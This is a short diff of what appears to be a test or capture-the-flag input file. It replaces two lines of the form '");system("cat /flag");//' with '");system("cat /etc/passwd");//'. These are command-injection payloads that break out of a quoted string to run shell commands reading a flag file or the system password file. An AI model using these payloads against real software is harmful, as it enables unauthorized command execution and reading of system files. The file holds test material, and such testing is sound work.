@@ -2,5 +2,4 @@ Hello
 Good
 Bad
 Test
-");system("cat /flag");//
-");system("cat /flag");//
+");system("cat /etc/passwd");//
